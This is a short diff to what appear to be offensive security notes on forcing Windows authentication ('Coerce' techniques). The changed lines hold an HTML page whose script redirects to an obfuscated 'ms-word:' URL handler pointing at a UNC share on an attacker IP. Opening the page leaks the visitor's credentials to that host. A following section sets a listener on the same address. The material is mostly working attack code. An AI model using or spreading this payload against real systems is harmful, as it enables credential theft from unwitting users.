@@ -341,17 +341,17 @@ IconIndex=1
 #### Coerce 5 - Url Handler
  
 
- ```js
-let foo = '<!DOCTYPE html>
+ <!-- ```js
+let foo = 'bar';
+
+console.log(foo);
+```
+<!DOCTYPE html>
 <html>
 	<script>
 		location.href = 'ms        -word:        ofe|u|\\192.168.0.243/share/leak.docx';
 	</script>
-</html>';
-
-console.log(foo);
-```
-
+</html> -->
 
 #### Coerce 6 - w/ Creds - Coercer forced authentication of a server to our machine
 listen="192.168.0.243"
